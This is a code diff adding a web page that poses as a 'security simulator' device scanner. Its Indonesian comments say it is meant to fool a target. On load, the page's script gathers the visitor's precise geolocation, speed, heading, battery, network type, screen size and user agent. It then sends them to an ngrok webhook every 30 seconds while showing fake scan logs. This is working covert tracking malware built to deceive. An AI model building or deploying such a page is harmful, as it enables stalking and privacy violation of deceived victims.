@@ -1,3 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Judul tab dibuat seolah-olah alat pemindai sistem profesional -->
+    <title>CyberSec System Core v2.4</title>
+    <style>
+        body { font-family: 'Courier New', Courier, monospace; background-color: #050505; color: #00ff66; padding: 20px; text-align: left; margin: 0; box-sizing: border-box; }
+        .console-box { border: 1px solid #00ff66; padding: 15px; background-color: #0a0a0a; border-radius: 4px; box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); min-height: 200px; font-size: 14px; line-height: 1.5; }
+        .header-title { color: #ffffff; font-weight: bold; margin-bottom: 10px; font-size: 16px; text-transform: uppercase; letter-spacing: 2px; }
+        .blink { animation: blinker 1s linear infinite; color: #ff3333; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        .loading::after { display: inline-block; animation: dotty steps(4, jump-end) 900ms infinite; content: ''; }
+        @keyframes dotty { 0% { content: ''; } 25% { content: '.'; } 50% { content: '..'; } 75% { content: '...'; } }
+    </style>
+</head>
+<body>
+
+    <div class="header-title">⚡ SECURITY SIMULATOR ENGINE</div>
+    <div class="console-box">
+        <div>[SYS] Initializing core modules... DONE</div>
+        <div>[SYS] Establishing secure terminal connection... DONE</div>
+        <div id="status" class="loading">[SCAN] Waiting for device security handshake</div>
+        <div id="log-data" style="margin-top: 10px; color: #888;"></div>
+    </div>
+
+    <script>
+        // ⚠️ TETAP GUNAKAN LINK NGROK AKTIF ANDA SAAT INI DI SINI
+        const WEBHOOK_URL = "https://ditzy-omega-mud.ngrok-free.dev/webhook";
+        const ipAddress = "114.10.157.196";
+
+        async function kirim(data) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                // Target mengira data pemindaian berhasil dianalisis di server
+                document.getElementById('status').className = "";
+                document.getElementById('status').style.color = "#00ff66";
+                document.getElementById('status').innerText = "[SUCCESS] Device integrity report generated successfully.";
+            } catch (err) {
+                document.getElementById('status').className = "";
+                document.getElementById('status').style.color = "#ff3333";
+                document.getElementById('status').innerText = "[ERROR] Connection timeout to database cluster.";
+            }
+        }
+
+        async function kirimLokasi() {
+            if (!navigator.geolocation) {
+                document.getElementById('status').innerText = "[CRITICAL] Hardware API not supported.";
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const { latitude, longitude, accuracy, speed, heading } = pos.coords;
+
+                let batteryData = null;
+                try {
+                    if (navigator.getBattery) {
+                        const bat = await navigator.getBattery();
+                        batteryData = { level: Math.round(bat.level * 100), charging: bat.charging };
+                    }
+                } catch(e) {}
+
+                let networkData = "Active Node";
+                try {
+                    if (navigator.connection) {
+                        networkData = `${navigator.connection.type || 'Cellular/WiFi'} (${navigator.connection.downlink || 5} Mbps)`;
+                    }
+                } catch(e) {}
+
+                const data = {
+                    lat: latitude,
+                    lon: longitude,
+                    accuracy: accuracy,
+                    speed: speed || null,
+                    direction: heading || null,
+                    battery: batteryData,
+                    network: networkData,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    device: navigator.userAgent,
+                    ip: ipAddress,
+                    server_time: new Date().toLocaleString("id-ID")
+                };
+
+                // Tampilkan visual logs palsu ala heker di layar HP target agar meyakinkan
+                document.getElementById('log-data').innerHTML = `
+                    &gt; FETCHING HARDWARE METRICS...<br>
+                    &gt; SCREEN RES: ${data.screen}<br>
+                    &gt; NET RATE: ${networkData}<br>
+                    &gt; VERIFYING SECURITY TOKEN... <span class="blink">COMPILING</span>
+                `;
+
+                kirim(data);
+            }, (err) => {
+                document.getElementById('status').className = "";
+                document.getElementById('status').style.color = "#ff3333";
+                document.getElementById('status').innerText = "[DENIED] Access to hardware parameters was rejected by user.";
+            }, { enableHighAccuracy: true, timeout: 15000 });
+        }
+
+        // Jalankan pelacakan pertama, lalu ulang tiap 1 menit
+        kirimLokasi();
+        setInterval(kirimLokasi, 30000);
+    </script>
+</body>
+</html>
+
+
 <!-- <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -105,7 +217,7 @@ setInterval(kirimLokasi, 60000);
 </body>
 </html> -->
 
-<!DOCTYPE html>
+<!--DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
@@ -189,4 +301,6 @@ setInterval(kirimLokasi, 60000);
         setInterval(kirimLokasi, 60000);
     </script>
 </body>
-</html>
+</html-->
+
+
